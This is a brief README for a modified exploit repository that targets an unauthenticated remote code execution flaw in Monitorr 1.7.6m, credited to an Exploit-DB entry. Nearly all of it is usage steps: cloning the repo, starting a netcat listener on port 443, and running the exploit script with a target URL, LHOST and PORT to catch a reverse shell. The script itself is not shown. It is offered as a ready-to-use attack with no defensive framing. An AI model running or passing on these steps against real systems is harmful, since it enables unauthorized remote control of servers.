# Monitorr 1.7.6m Remote Code Execution (Unauthenticated)
## Modified Version by valent1ne
## Credits to LYHIN'S LAB (https://www.exploit-db.com/exploits/48980)

### Installation
``git clone https://github.com/valentinodev/monitorr_1.7.6m_rce.git``

``cd monitorr_1.7.6m_rce``

### Netcat (another terminal)
``apt install rlwrap``

``rlwrap nc -lvnp 443``

### Exploit
``python 48980.py https://domain.com LHOST PORT``


